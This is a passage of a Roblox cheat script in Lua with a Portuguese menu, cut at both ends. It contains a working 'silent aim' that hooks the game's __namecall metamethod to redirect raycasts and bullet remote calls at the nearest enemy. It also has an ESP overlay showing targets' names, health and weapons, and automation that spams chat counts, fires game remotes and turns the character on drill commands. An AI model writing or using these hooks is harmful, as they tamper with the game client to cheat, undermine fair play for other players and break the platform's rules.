if pcall(function() ScreenGui.Parent = CoreGui end) then
    _G.AimbotGui = ScreenGui
else
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    _G.AimbotGui = ScreenGui
end

local TargetHighlight = Instance.new("Highlight")
TargetHighlight.Name = "H"
TargetHighlight.FillTransparency = 0.5
TargetHighlight.OutlineTransparency = 0
TargetHighlight.Parent = ScreenGui
_G.AimHighlight = TargetHighlight

local InfoPanelTop = Instance.new("BillboardGui", ScreenGui); InfoPanelTop.Size = UDim2.new(0, 200, 0, 50); InfoPanelTop.StudsOffset = Vector3New(0, 4, 0); InfoPanelTop.AlwaysOnTop = true; InfoPanelTop.Enabled = false 
local LabelTop = Instance.new("TextLabel", InfoPanelTop); LabelTop.BackgroundTransparency = 1; LabelTop.Size = UDim2.new(1, 0, 1, 0); LabelTop.Font = Enum.Font.GothamBold; LabelTop.TextYAlignment = Enum.TextYAlignment.Bottom; LabelTop.TextSize = 14
local InfoPanelBot = Instance.new("BillboardGui", ScreenGui); InfoPanelBot.Size = UDim2.new(0, 200, 0, 50); InfoPanelBot.StudsOffset = Vector3New(0, -3.5, 0); InfoPanelBot.AlwaysOnTop = true; InfoPanelBot.Enabled = false
local LabelBot = Instance.new("TextLabel", InfoPanelBot); LabelBot.BackgroundTransparency = 1; LabelBot.Size = UDim2.new(1, 0, 1, 0); LabelBot.Font = Enum.Font.GothamBold; LabelBot.TextYAlignment = Enum.TextYAlignment.Top; LabelBot.TextSize = 13

local function UpdateESP(targetChar)
    local config = _G.AimbotConfig
    TargetHighlight.FillColor = config.HighlightColor
    if config.Enabled and config.ShowHighlight and targetChar then
        TargetHighlight.Adornee = targetChar
        TargetHighlight.Enabled = true
    else
        TargetHighlight.Adornee = nil
        TargetHighlight.Enabled = false
    end

    if not config.ESP.Enabled or not targetChar then
        InfoPanelTop.Enabled = false
        InfoPanelBot.Enabled = false
        return
    end

    local player = Players:GetPlayerFromCharacter(targetChar)
    if player then
        local head = targetChar:FindFirstChild("Head")
        local root = targetChar:FindFirstChild("HumanoidRootPart")
        local hum = targetChar:FindFirstChild("Humanoid")

        if head and root and hum then
            InfoPanelTop.Adornee = head; InfoPanelTop.Enabled = true
            InfoPanelBot.Adornee = root; InfoPanelBot.Enabled = true
            
            local nameStr = config.ESP.ShowName and "[" .. player.Name .. "]" or ""
            local hpStr = config.ESP.ShowHealth and "[" .. math.floor(hum.Health) .. "]" or ""
            
            LabelTop.Text = nameStr .. (nameStr ~= "" and "\n" or "") .. hpStr
            LabelTop.TextColor3 = config.ESP.ShowHealth and Color3.new(1 - (hum.Health/100), (hum.Health/100), 0) or config.ESP.TextColor
            LabelTop.TextStrokeColor3 = config.ESP.OutlineColor

            local tool = targetChar:FindFirstChildWhichIsA("Tool")
            LabelBot.Text = (config.ESP.ShowWeapon and tool) and "[" .. tool.Name .. "]" or ""
            LabelBot.TextColor3 = config.ESP.TextColor
            LabelBot.TextStrokeColor3 = config.ESP.OutlineColor
        else
            InfoPanelTop.Enabled = false; InfoPanelBot.Enabled = false
        end
    end
end

local ClosestHitPart = nil
local CurrentTargetCharacter = nil

local function IsPartVisible(part, character)
    if not _G.AimbotConfig.WallCheck then return true end
    local origin = Camera.CFrame.Position
    local direction = part.Position - origin
    RayParams.FilterDescendantsInstances = {LocalPlayer.Character, character, Camera, ScreenGui}
    local rayResult = Workspace:Raycast(origin, direction, RayParams)
    return rayResult == nil
end

local function GetBestPart(character)
    local targets = _G.AimbotConfig.TargetPart
    if typeof(targets) ~= "table" then targets = {targets} end
    
    if #targets == 0 or table.find(targets, "Random") then
        targets = {"Head", "HumanoidRootPart", "UpperTorso", "LowerTorso", "Torso", "LeftUpperArm", "RightUpperArm", "LeftUpperLeg", "RightUpperLeg"}
    end

    for _, name in IPairs(targets) do
        local part = character:FindFirstChild(name)
        if part and IsPartVisible(part, character) then return part end
    end
    return nil
end

local function getClosestPlayer()
    local BestPart = nil
    local BestChar = nil
    local ShortestDistance = _G.AimbotConfig.FOVSize 
    local OriginPos = (_G.AimbotConfig.FOVBehavior == "Mouse") and UserInputService:GetMouseLocation() or Vector2New(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local myPos = Camera.CFrame.Position

    for _, Player in Pairs(Players:GetPlayers()) do
        if Player == LocalPlayer then continue end
        if _G.AimbotConfig.TeamCheck == "Team" and Player.Team == LocalPlayer.Team then continue end
        if isWhitelisted(Player) then continue end

        local Character = Player.Character
        if not Character then continue end
        
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Humanoid = Character:FindFirstChild("Humanoid")
        
        if not RootPart or not Humanoid or Humanoid.Health <= 0 then continue end
        
        if (RootPart.Position - myPos).Magnitude > _G.AimbotConfig.MaxDistance then continue end

        local ReferencePart = Character:FindFirstChild("Head") or RootPart
        local screenPos, onScreen = Camera:WorldToScreenPoint(ReferencePart.Position)
        
        if onScreen then
            local dist2D = (OriginPos - Vector2New(screenPos.X, screenPos.Y)).Magnitude
            if dist2D < ShortestDistance then
                local ValidPart = GetBestPart(Character)
                if ValidPart then
                    ShortestDistance = dist2D
                    BestPart = ValidPart
                    BestChar = Character
                end
            end
        end
    end
    return BestPart, BestChar
end

RunService.RenderStepped:Connect(function()
    if _G.AimbotConfig.Enabled then
        local Part, Character = getClosestPlayer()
        ClosestHitPart = Part
        CurrentTargetCharacter = Character
    else
        ClosestHitPart = nil
        CurrentTargetCharacter = nil
    end
    UpdateESP(CurrentTargetCharacter)
end)

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    if not checkcaller() and _G.AimbotConfig.Enabled and ClosestHitPart then
        local Method = getnamecallmethod()
        
        if MathRandom(1, 100) <= _G.AimbotConfig.HitChance then
            local Arguments = {...}

            if Method == "Raycast" and self == Workspace then
                local finalPosition = ClosestHitPart.Position + getLegitOffset()
                local origin = Arguments[1] 
                local direction = (finalPosition - origin).Unit * 1000 
                Arguments[2] = direction 
                return oldNamecall(self, unpack(Arguments))
            
            elseif (Method == "FireServer" or Method == "InvokeServer") then
                
                if isBulletRemote(self.Name) then
                    local finalPosition = ClosestHitPart.Position + getLegitOffset()
                    local cameraPos = Camera.CFrame.Position
                    
                    for i, v in Pairs(Arguments) do
                        
                        if typeof(v) == "Vector3" then
                            if v.Magnitude <= 5 then 
                                Arguments[i] = (finalPosition - cameraPos).Unit
                            else
                                Arguments[i] = finalPosition
                            end
                        
                        elseif typeof(v) == "CFrame" then
                            Arguments[i] = CFrameNew(cameraPos, finalPosition)
                        
                        elseif typeof(v) == "table" then
                            for k, subVal in Pairs(v) do
                                if typeof(subVal) == "Vector3" then
                                     if subVal.Magnitude <= 5 then
                                        v[k] = (finalPosition - cameraPos).Unit
                                     else
                                        v[k] = finalPosition
                                     end
                                elseif typeof(subVal) == "CFrame" then
                                    v[k] = CFrameNew(cameraPos, finalPosition)
                                end
                            end
                        end
                    end
                    return oldNamecall(self, unpack(Arguments))
                end
            end
        end
    end
    return oldNamecall(self, ...)
end))

do
    local SilentTab = CombateSection:Tab({
        Title = "Silent aim",
        Icon = "lucide:drama",
        IconColor = Color3.fromRGB(30, 70, 180)
    })

    local ToggleAim = SilentTab:Toggle({
        Title = "Ativar",
        Desc = "Ativa o silent aim",
        Icon = "lucide:check",
        Type = "Checkbox",
        Value = _G.AimbotConfig.Enabled,
        Callback = function(state) 
            _G.AimbotConfig.Enabled = state
        end
    })
    
    local SliderChance = SilentTab:Slider({
        Title = "Chance de acerto",
        Desc = "Porcentagem de tiros que serão redirecionados",
        Step = 1,
        Value = { Min = 0, Max = 100, Default = _G.AimbotConfig.HitChance },
        Callback = function(value) _G.AimbotConfig.HitChance = value end
    })
    
    SilentTab:Space()
    
    local function GetPlayerNames()
        local names = {}
        for _, p in Pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then table.insert(names, p.Name) end
        end
        return names
    end

    local function GetTeamNames()
        local names = {}
        if TeamsService then
            for _, t in Pairs(TeamsService:GetTeams()) do table.insert(names, t.Name) end
        end
        return names
    end

    SilentTab:Paragraph({
        Title = "Whitelist",
        Desc = "Permite você ignorar certos jogadores ou times",
        Color = Color3.fromHex("#F2F3F5"),
        Image = "lucide:id-card-lanyard",
        ImageSize = 30
    })

    local PlayerWhitelist
    
    SilentTab:Button({
        Title = "Atualizar",
        Desc = "Atualiza a lista de players",
        Callback = function()
            if PlayerWhitelist then PlayerWhitelist:Refresh(GetPlayerNames()) end
        end
    })

    PlayerWhitelist = SilentTab:Dropdown({
        Title = "Players",
        Color = Color3.fromHex("#FCFFFD"),
        Desc = "Ignora jogadores específicos",
        Values = GetPlayerNames(),
        Value = {}, 
        Multi = true,
        AllowNone = true,
        Callback = function(options) _G.AimbotConfig.WhitelistedUsers = options end
    })

    local TeamWhitelist = SilentTab:Dropdown({
        Title = "Times",
        Color = Color3.fromHex("#FCFFFD"),
        Desc = "Ignora times específicos",
        Values = GetTeamNames(),
        Value = {},
        Multi = true,
        AllowNone = true,
        Callback = function(options) _G.AimbotConfig.WhitelistedTeams = options end
    })

    SilentTab:Space()

    local DropdownPart = SilentTab:Dropdown({
        Title = "Parte do corpo",
        Desc = "Onde o tiro irá acertar",
        Values = { "Random", "Head", "HumanoidRootPart", "UpperTorso", "LowerTorso", "Torso", "LeftUpperArm", "RightUpperArm", "LeftUpperLeg", "RightUpperLeg" },
        Value = {"Random"},
        Multi = true,
        AllowNone = true,
        Callback = function(option) _G.AimbotConfig.TargetPart = option end
    })

    local DropdownTeam = SilentTab:Dropdown({
        Title = "Alvod",
        Desc = "Quem deve ser focado",
        Values = { "Todos", "Inimigos" },
        Value = "Inimigos",
        Callback = function(option) _G.AimbotConfig.TeamCheck = (option == "Todos") and "All" or "Team" end
    })

    local ToggleOffset = SilentTab:Toggle({
        Title = "Legit",
        Desc = "O tiro será mais real",
        Icon = "lucide:check",
        Type = "Checkbox",
        Value = _G.AimbotConfig.UseLegitOffset,
        Callback = function(state) _G.AimbotConfig.UseLegitOffset = state end
    })

    local ToggleWall = SilentTab:Toggle({
        Title = "Wall check",
        Desc = "Ignora jogadores atrás de paredes",
        Icon = "lucide:check",
        Type = "Checkbox",
        Value = _G.AimbotConfig.WallCheck,
        Callback = function(state) _G.AimbotConfig.WallCheck = state end
    })

    SilentTab:Space()

    SilentTab:Paragraph({
        Title = "Visuais",
        Desc = "Configurações visuais",
        Color = "Blue",
        Image = "lucide:eye",
        ImageSize = 30
    })

    local ToggleFOV = SilentTab:Toggle({
        Title = "FOV",
        Desc = "Mostra o FOV",
        Icon = "lucide:check",
        Type = "Checkbox",
        Value = _G.AimbotConfig.ShowFOV,
        Callback = function(state) _G.AimbotConfig.ShowFOV = state end
    })

    local DropdownFOVPos = SilentTab:Dropdown({
        Title = "Posição",
        Desc = "Onde o FOV vai ficar",
        Values = { "Mouse", "Center" },
        Value = "Center",
        Callback = function(option) _G.AimbotConfig.FOVBehavior = option end
    })

    local SliderFOV = SilentTab:Slider({
        Title = "Tamanho",
        Desc = "Tamanho do FOV",
        Step = 5,
        Value = { Min = 40, Max = 1000, Default = _G.AimbotConfig.FOVSize },
        Callback = function(value) _G.AimbotConfig.FOVSize = value end
    })

    local SliderDist = SilentTab:Slider({
        Title = "Distância",
        Desc = "Alcance máximo do silent aim",
        Step = 10,
        Value = { Min = 50, Max = 5000, Default = _G.AimbotConfig.MaxDistance },
        Callback = function(value) _G.AimbotConfig.MaxDistance = value end
    })

    local ColorFOV1 = SilentTab:Colorpicker({
        Title = "Cor",
        Desc = "Cor do FOV",
        Default = _G.AimbotConfig.FOVColor1,
        Transparency = 0,
        Locked = false,
        Callback = function(color) _G.AimbotConfig.FOVColor1 = color end
    })

    SilentTab:Space()

    local ToggleHighlight = SilentTab:Toggle({
        Title = "Highlight",
        Desc = "Faz a pessoa brilhar",
        Icon = "lucide:check",
        Type = "Checkbox",
        Value = _G.AimbotConfig.ShowHighlight,
        Callback = function(state) _G.AimbotConfig.ShowHighlight = state end
    })

    local ColorHigh = SilentTab:Colorpicker({
        Title = "Cor",
        Desc = "Cor do highlight",
        Default = _G.AimbotConfig.HighlightColor,
        Transparency = 0,
        Locked = false,
        Callback = function(color) _G.AimbotConfig.HighlightColor = color end
    })

    SilentTab:Space()
    SilentTab:Paragraph({
        Title = "Info",
        Desc = "Quando um usuário for focado pelo silent aim, algumas informações sobre ele aparecerão",
        Color = "Blue",
        Image = "lucide:info",
        ImageSize = 30
    })

    local ToggleName, ToggleHP, ToggleWeapon

    local ToggleESP = SilentTab:Toggle({
        Title = "Info",
        Desc = "Permite visualizar as informações abaixo",
        Icon = "lucide:check",
        Type = "Checkbox",
        Value = _G.AimbotConfig.ESP.Enabled,
        Callback = function(state) 
            _G.AimbotConfig.ESP.Enabled = state
            if state then
                if ToggleName then ToggleName:Unlock() end
                if ToggleHP then ToggleHP:Unlock() end
                if ToggleWeapon then ToggleWeapon:Unlock() end
            else
                if ToggleName then ToggleName:Lock() end
                if ToggleHP then ToggleHP:Lock() end
                if ToggleWeapon then ToggleWeapon:Lock() end
            end
        end
    })

    ToggleName = SilentTab:Toggle({
        Title = "Nome",
        Desc = "Mostra o nome da pessoa focada",
        Icon = "lucide:user",
        Type = "Checkbox",
        Value = _G.AimbotConfig.ESP.ShowName,
        Callback = function(state) _G.AimbotConfig.ESP.ShowName = state end
    })

    ToggleHP = SilentTab:Toggle({
        Title = "Vida",
        Desc = "Mostra a vida da pessoa focada",
        Icon = "lucide:heart",
        Type = "Checkbox",
        Value = _G.AimbotConfig.ESP.ShowHealth,
        Callback = function(state) _G.AimbotConfig.ESP.ShowHealth = state end
    })

    ToggleWeapon = SilentTab:Toggle({
        Title = "Item",
        Desc = "Mostra o item equipado da pessoa focada",
        Icon = "lucide:sword",
        Type = "Checkbox",
        Value = _G.AimbotConfig.ESP.ShowWeapon,
        Callback = function(state) _G.AimbotConfig.ESP.ShowWeapon = state end
    })
    
    if not _G.AimbotConfig.ESP.Enabled then
        ToggleName:Lock(); ToggleHP:Lock(); ToggleWeapon:Lock()
    end
end

end


-- Auto JJ's

local RemoteChat = {}

function RemoteChat:Send(Message)
    task.spawn(function()
        local msgString = tostring(Message)
        local sent = false

        local TCS = game:GetService("TextChatService")
        local channelsFolder = TCS:FindFirstChild("TextChannels")

        if channelsFolder then
    
            local inputConfig = TCS:FindFirstChildOfClass("ChatInputBarConfiguration")
            if inputConfig and inputConfig.TargetTextChannel then
                local success = pcall(function()
                    inputConfig.TargetTextChannel:SendAsync(msgString)
                end)
                if success then sent = true end
            end

  
            if not sent then
                local general = channelsFolder:FindFirstChild("RBXGeneral")
                if general then
                    local success = pcall(function()
                        general:SendAsync(msgString)
                    end)
                    if success then sent = true end
                end
            end

            if not sent then
                local anyChannel = channelsFolder:FindFirstChildOfClass("TextChannel")
                if anyChannel then
                    local success = pcall(function()
                        anyChannel:SendAsync(msgString)
                    end)
                    if success then sent = true end
                end
            end
        end

        if not sent then
            local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            local sayMsg = chatEvents and chatEvents:FindFirstChild("SayMessageRequest")
            if sayMsg then
                pcall(function()
                    sayMsg:FireServer(msgString, "All")
                end)
            end
        end
    end)
end

local Character = {}
Character.__index = Character

function Character.new(Plr)
	local self = setmetatable({}, Character)
	self.Player = Plr
	self.Connections = {}
	self.Character = Plr.Character or Plr.CharacterAdded:Wait()
	self.Humanoid = self.Character:WaitForChild("Humanoid", 95)
	self.Root = self.Character:WaitForChild("HumanoidRootPart", 95)
	
	table.insert(self.Connections, Plr.CharacterAdded:Connect(function(Char)
		self.Character = Char
		self.Humanoid = Char:WaitForChild("Humanoid", 95)
		self.Root = Char:WaitForChild("HumanoidRootPart", 95)
	end))
	
	return self
end

function Character:ChangeHumanoidState(stateEnum)
	if not self.Humanoid then return false end
	local success = pcall(function()
		self.Humanoid:ChangeState(stateEnum)
	end)
	return success
end

function Character:Jump()
	if not self.Humanoid then return false end
	local state = self.Humanoid:GetState()
	if state == Enum.HumanoidStateType.Running
	or state == Enum.HumanoidStateType.RunningNoPhysics
	or state == Enum.HumanoidStateType.Landed then
		return self:ChangeHumanoidState(Enum.HumanoidStateType.Jumping)
	end
	return false
end

local Char = Character.new(Player)

local accentMap = {
    ["á"]="Á",["à"]="À",["ã"]="Ã",["â"]="Â",
    ["é"]="É",["ê"]="Ê",
    ["í"]="Í",
    ["ó"]="Ó",["ô"]="Ô",["õ"]="Õ",
    ["ú"]="Ú",
    ["ç"]="Ç"
}

local function unicodeUpper(str)
    local out = {}
    for _,c in utf8.codes(str) do
        local ch = utf8.char(c)
        out[#out+1] = accentMap[ch] or string.upper(ch)
    end
    return table.concat(out)
end

local units = {
    [0]="zero",[1]="um",[2]="dois",[3]="três",[4]="quatro",[5]="cinco",
    [6]="seis",[7]="sete",[8]="oito",[9]="nove",[10]="dez",[11]="onze",
    [12]="doze",[13]="treze",[14]="quatorze",[15]="quinze",[16]="dezesseis",
    [17]="dezessete",[18]="dezoito",[19]="dezenove"
}

local tens = {
    [2]="vinte",[3]="trinta",[4]="quarenta",[5]="cinquenta",
    [6]="sessenta",[7]="setenta",[8]="oitenta",[9]="noventa"
}

local hundreds = {
    [1]="cento",[2]="duzentos",[3]="trezentos",[4]="quatrocentos",
    [5]="quinhentos",[6]="seiscentos",[7]="setecentos",[8]="oitocentos",
    [9]="novecentos"
}

local scales_singular = {
    [1]="mil",[2]="milhão",[3]="bilhão",[4]="trilhão",[5]="quatrilhão"
}

local scales_plural = {
    [1]="mil",[2]="milhões",[3]="bilhões",[4]="trilhões",[5]="quatrilhões"
}

local function threeDigitToWords(n)
    if n == 0 then return "" end
    if n == 100 then return "cem" end
    local h = math.floor(n / 100)
    local rest = n % 100
    local parts = {}
    if h > 0 then table.insert(parts, hundreds[h]) end
    if rest < 20 then
        if rest > 0 then table.insert(parts, units[rest]) end
    else
        table.insert(parts, tens[math.floor(rest/10)])
        local u = rest % 10
        if u > 0 then table.insert(parts, units[u]) end
    end
    return table.concat(parts, " e ")
end

local function numberToWords(num)
    num = tonumber(num)
    if not num then return "NÚMERO INVÁLIDO" end
    if num == 0 then return "ZERO" end
    local groups = {}
    while num > 0 do
        table.insert(groups, num % 1000)
        num = math.floor(num / 1000)
    end
    local parts = {}
    for i = #groups,1,-1 do
        local val = groups[i]
        if val ~= 0 then
            local text = threeDigitToWords(val)
            if i > 1 then
                local scale = (val==1) and scales_singular[i-1] or scales_plural[i-1]
                if i == 2 and val == 1 then
                    text = "mil"
                else
                    text = text.." "..scale
                end
            end
            table.insert(parts, text)
        end
    end
    return unicodeUpper(table.concat(parts, " e "))
end

local running = false
local startValue = 1
local endValue = 100
local delayValue = 1.5              
local randomDelayEnabled = false    
local randomMin = 1                 
local randomMax = 3                
local jumpEnabled = false           
local spacingEnabled = false        
local reverseEnabled = false        
local finishInTimeEnabled = false
local finishTotalTime = 60
local suffix = "!"
local customSuffix = ""
local selectedMode = "Padrão"

do
    local Auto = AutoSection:Tab({
        Title = "Auto JJ's",
        Icon = "lucide:keyboard",
        IconColor = Color3.fromRGB(255, 0, 0)
    })

    local ETAParagraph = Auto:Paragraph({
        Title = "Tempo",
        Desc  = "Aguardando...",
        Color = "Green",
        Image = "",
        ImageSize = 0,
        Thumbnail = "",
        ThumbnailSize = 0,
        Locked = false,
    })

    local function updateETA(remaining, secondsLeft)
        ETAParagraph:SetTitle("Tempo")
        ETAParagraph:SetDesc(
            string.format(
                "Restando: %d JJ's\nTempo estimado: %.1f segundos",
                remaining,
                math.max(secondsLeft, 0)
            )
        )
    end

    local JJs = Auto:Section({
        Title = "Essenciais"
    })

    local jjTypes = {"Padrão"}
    local defaultMode = "Padrão"

    if DELTA_MAPA then
        table.insert(jjTypes, "JJ (Delta)")
        defaultMode = "JJ (Delta)"
    end

    if TEVEZ_MAPA then
        table.insert(jjTypes, "Canguru")
    end

    selectedMode = defaultMode

    JJs:Dropdown({
        Title = "Tipo de JJ",
        Values = jjTypes,
        Value = defaultMode,
        Callback = function(v)
            selectedMode = v
        end
    })

    JJs:Toggle({
        Title = "Auto JJ's",
        Callback = function(v)
            running = v

            if running then
                task.spawn(function()
                    
                    local deltaAnimInstance = nil
                    
                    if selectedMode == "JJ (Delta)" then
                        deltaAnimInstance = Instance.new("Animation")
                        deltaAnimInstance.AnimationId = "rbxassetid://105471471504794"
                        
                        local argsPrep = {"Prepare"}
                        local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Polichinelos")
                        remote:FireServer(unpack(argsPrep))
                        
                        local argsStart = {"Start"}
                        remote:FireServer(unpack(argsStart))
                    end

                    local i = startValue
                    local limit = endValue
                    local step = 1

                    if reverseEnabled then
                        i = endValue
                        limit = startValue
                        step = -1
                    end

                    local totalJJ = math.abs(endValue - startValue) + 1
                    local forcedDelay = nil
                    local estimatedFinishTime = 0

                    if finishInTimeEnabled then
                        forcedDelay = finishTotalTime / totalJJ
                        estimatedFinishTime = finishTotalTime
                    end

                    local executed = 0
                    local countdown = estimatedFinishTime

                    for num = i, limit, step do
                        if not running then break end

                        executed = executed + 1
                        local remaining = totalJJ - executed

                        if finishInTimeEnabled then
                            countdown = finishTotalTime - (executed * forcedDelay)
                        else
                            local avgDelay = randomDelayEnabled
                                and ((randomMin + randomMax) / 2)
                                or delayValue

                            countdown = remaining * avgDelay
                        end

                        updateETA(remaining, countdown)

                        if selectedMode == "JJ (Delta)" then
                            local args = {"Add", 1}
                            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Polichinelos"):FireServer(unpack(args))

                            if Char and Char.Humanoid and deltaAnimInstance then
                                local track = Char.Humanoid:LoadAnimation(deltaAnimInstance)
                                track:Play()
                            end
                        
                        elseif selectedMode == "Canguru" then
                            local word = numberToWords(num)
                            local finalSuffix = (customSuffix ~= "" and customSuffix) or suffix
                            local msg = spacingEnabled and (word .. " " .. finalSuffix) or (word .. finalSuffix)
                            
                            RemoteChat:Send(msg)
                            task.wait(0.2)

                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.C, false, game)
                            task.wait()
                            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.C, false, game)
                            task.wait(0.2)
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.C, false, game)
                            task.wait()
                            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.C, false, game)
                            task.wait(0.1)

                            Char:Jump()
                            task.wait(0.2)

                            local character = Char.Character
                            local rootPart = Char.Root
                            local humanoid = Char.Humanoid

                            if rootPart and humanoid then
                                humanoid.AutoRotate = false
                                local rotValue = Instance.new("NumberValue")
                                rotValue.Value = 0
                                
                                local baseAngle = math.random(355, 365)
                                local direction = (math.random(1, 2) == 1) and 1 or -1
                                local targetAngle = baseAngle * direction

                                local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
                                local tween = TweenService:Create(rotValue, tweenInfo, {Value = targetAngle})
                                
                                local startRotation = rootPart.CFrame.Rotation
                                local connection
                                connection = RunService.Heartbeat:Connect(function()
                                    if rootPart then
                                        local currentPos = rootPart.Position
                                        rootPart.CFrame = CFrame.new(currentPos) * startRotation * CFrame.Angles(0, math.rad(rotValue.Value), 0)
                                        rootPart.AssemblyLinearVelocity = rootPart.AssemblyLinearVelocity
                                    end
                                end)
                                
                                tween.Completed:Connect(function()
                                    connection:Disconnect()
                                    rotValue:Destroy()
                                    humanoid.AutoRotate = true
                                end)
                                
                                tween:Play()
                            end
                            task.wait(0.1)

                        else
                            local word = numberToWords(num)
                            local finalSuffix = (customSuffix ~= "" and customSuffix) or suffix
                            local msg = spacingEnabled and (word .. " " .. finalSuffix) or (word .. finalSuffix)
                            
                            RemoteChat:Send(msg)

                            if jumpEnabled then
                                Char:Jump()
                            end
                        end

                        if finishInTimeEnabled and forcedDelay then
                            task.wait(forcedDelay)
                        else
                            if randomDelayEnabled then
                                local steps = math.floor((randomMax - randomMin) / 0.1)
                                if steps < 0 then steps = 0 end
                                local randStep = math.random(0, steps)
                                local delay = randomMin + (randStep * 0.1)
                                task.wait(delay)
                            else
                                task.wait(delayValue)
                            end
                        end
                    end
                    updateETA(0, 0)
                end)
            end
        end
    })
    JJs:Space()

    JJs:Input({
        Title = "Inicial",
        Placeholder = "Ex: 1",
        Callback = function(v)
            if v == "" then return end
            startValue = tonumber(v) or 1
        end
    })

    JJs:Input({
        Title = "Final",
        Placeholder = "Ex: 100",
        Callback = function(v)
            if v == "" then return end
            endValue = tonumber(v) or 100
        end
    })

    JJs:Toggle({
        Title = "Pular",
        Desc = "Pular ao enviar JJ's (Apenas modo Padrão).",
        Callback = function(v)
            jumpEnabled = v
        end
    })

    JJs:Toggle({
        Title = "Espaçamento",
        Desc = "Separa o sufixo do número. (Ex: UM !)",
        Callback = function(v)
            spacingEnabled = v
        end
    })
    JJs:Space()

    JJs:Toggle({
        Title = "Intervalo inteligente",
        Desc  = "Ignora todos os intervalos e termina exatamente no tempo indicado.",
        Callback = function(v)
            finishInTimeEnabled = v
        end
    })

    JJs:Input({
        Title = "Tempo (segundos)",
        Placeholder = "Ex: 100",
        Callback = function(v)
            if v == "" then return end
            finishTotalTime = tonumber(v) or 60
        end
    })
    JJs:Space()

    JJs:Dropdown({
        Title = "Sufixo",
        Values = { "!", "?", ".", ",", "/" },
        Value = "!",
        Callback = function(v)
            suffix = v
        end
    })
    JJs:Space()

    JJs:Input({
        Title = "Sufixo customizado",
        Placeholder = "Ex: @",
        Callback = function(v)
            customSuffix = tostring(v or "")
        end
    })

    local intervalos = Auto:Section({
        Title = "Intervalo"
    })

    intervalos:Input({
        Title = "Intervalo fixo (segundos)",
        Placeholder = "Ex: 1.5",
        Callback = function(v)
            if v == "" then return end
            delayValue = tonumber(v) or 1.5
        end
    })
    intervalos:Space()

    intervalos:Toggle({
        Title = "Intervalo dinâmico",
        Desc  = "Usa um intervalo aleatório entre mínimo e máximo.",
        Callback = function(v)
            randomDelayEnabled = v
        end
    })

    intervalos:Input({
        Title = "Valor mínimo",
        Placeholder = "Ex: 1",
        Callback = function(v)
            if v == "" then return end
            randomMin = tonumber(v) or 1
        end
    })

    intervalos:Input({
        Title = "Valor máximo",
        Placeholder = "Ex: 3",
        Callback = function(v)
            if v == "" then return end
            randomMax = tonumber(v) or 3
        end
    })

    local Extras = Auto:Section({
        Title = "Extras"
    })

    Extras:Toggle({
        Title = "Modo reverso",
        Desc  = "Conta de trás pra frente.",
        Callback = function(v)
            reverseEnabled = v
        end
    })
end




-- VOLVERS
do
    local Enabled = false
    local InstructorName = ""
    local BaseYaw = 0
    local Connections = {}

    local CommandQueue = {}
    local Processing = false

    local SuffixSpaced = false

    local function notify(t, c)
        if Notify then
            Notify(t, c)
        end
    end

    local function disconnectAll()
        for _, c in ipairs(Connections) do
            c:Disconnect()
        end
        table.clear(Connections)
    end

    local function getHRP()
        local c = LocalPlayer.Character
        return c and c:FindFirstChild("HumanoidRootPart")
    end

    local function rand(a, b)
        return a + math.random() * (b - a)
    end

    local function isAllUpper(msg)
        return msg == msg:upper()
    end

    local function normalizeCompact(msg)
        return msg
            :upper()
            :gsub("%s+", "")
            :gsub("[^A-Z!]", "")
    end

    local function validSuffix(raw)
        if SuffixSpaced then
            return raw:find(" !", 1, true) ~= nil
        else
            return raw:find("!", 1, true) and not raw:find(" !", 1, true)
        end
    end

    local function smoothRotate(delta)
        local hrp = getHRP()
        if not hrp then return end

        local startCF = hrp.CFrame
        local targetCF = startCF * CFrame.Angles(0, delta, 0)

        local baseDuration = rand(0.5, 0.65)
        local elapsed = 0
        local noiseSeed = math.random() * 10

        local conn
        conn = RunService.Heartbeat:Connect(function(dt)
            elapsed += dt

            local speedNoise = 1 + math.sin(elapsed * 6 + noiseSeed) * 0.08
            local duration = baseDuration / speedNoise

            local alpha = math.clamp(elapsed / duration, 0, 1)
            alpha = alpha * alpha * (3 - 2 * alpha)

            hrp.CFrame = startCF:Lerp(targetCF, alpha)

            if alpha >= 1 then
                conn:Disconnect()
            end
        end)
    end

    local function returnBase()
        local hrp = getHRP()
        if not hrp then return end

        local startCF = hrp.CFrame
        local targetCF = CFrame.new(hrp.Position) * CFrame.Angles(0, BaseYaw, 0)

        local baseDuration = rand(0.5, 0.65)
        local elapsed = 0
        local noiseSeed = math.random() * 10

        local conn
        conn = RunService.Heartbeat:Connect(function(dt)
            elapsed += dt

            local speedNoise = 1 + math.sin(elapsed * 6 + noiseSeed) * 0.08
            local duration = baseDuration / speedNoise

            local alpha = math.clamp(elapsed / duration, 0, 1)
            alpha = alpha * alpha * (3 - 2 * alpha)

            hrp.CFrame = startCF:Lerp(targetCF, alpha)

            if alpha >= 1 then
                conn:Disconnect()
            end
        end)
    end

    local function enqueue(action, label)
        table.insert(CommandQueue, action)
        Notify("Auto volver's", "Fileira: " .. label)

        if not Processing then
            Processing = true
            task.spawn(function()
                while #CommandQueue > 0 and Enabled do
                    local cmd = table.remove(CommandQueue, 1)
                    task.wait(rand(0.3, 0.5))
                    cmd()
                    task.wait(rand(0.15, 0.25))
                end
                Processing = false
            end)
        end
    end

    local function handle(msg)
        if not isAllUpper(msg) then
            Notify("Auto volver's", "Ignorado (não está em maiúsculo).")
            return
        end

        if not validSuffix(msg) then
            Notify("Auto volver's", "Ignorado (sufixo errado).")
            return
        end

        local compact = normalizeCompact(msg)

        if compact == "DIREITAVOLVER!" then
            enqueue(function()
                smoothRotate(-math.rad(rand(80, 100)))
            end, "DIREITA VOLVER")

        elseif compact == "ESQUERDAVOLVER!" then
            enqueue(function()
                smoothRotate(math.rad(rand(80, 100)))
            end, "ESQUERDA VOLVER")

        elseif compact == "RETAGUARDAVOLVER!" then
            enqueue(function()
                smoothRotate(math.rad(rand(170, 190)))
